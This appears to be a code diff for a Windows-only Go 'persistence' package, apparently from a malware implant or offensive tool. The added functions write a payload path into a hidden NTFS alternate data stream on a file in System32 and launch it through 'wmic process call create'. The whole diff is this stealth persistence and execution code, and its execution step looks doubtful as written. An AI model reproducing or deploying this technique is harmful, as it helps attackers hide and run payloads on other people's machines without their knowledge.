@@ -1,25 +1,25 @@
-package windows
+//go:build windows
+
+package persistence
 
 import (
-"os"
+"os/exec"
 )
 
-type ADSPersistence struct{}
-
-func NewADSPersistence() *ADSPersistence {
-return &ADSPersistence{}
-}
-
-func (a *ADSPersistence) WriteADS(file, data string) error {
-adsPath := file + ":angel"
-return os.WriteFile(adsPath, []byte(data), 0644)
-}
-
-func (a *ADSPersistence) ReadADS(file string) (string, error) {
-adsPath := file + ":angel"
-data, err := os.ReadFile(adsPath)
+func ADSPersist(payloadPath string) bool {
+cmd := exec.Command("cmd", "/c", "echo "+payloadPath+" > C:\\Windows\\System32\\ANGEL.txt:ANGEL")
+err := cmd.Run()
 if err != nil {
-return "", err
+return false
 }
-return string(data), nil
+return true
+}
+
+func ADSExecute() bool {
+cmd := exec.Command("cmd", "/c", "wmic process call create \"C:\\Windows\\System32\\ANGEL.txt:ANGEL\"")
+err := cmd.Run()
+if err != nil {
+return false
+}
+return true
 }
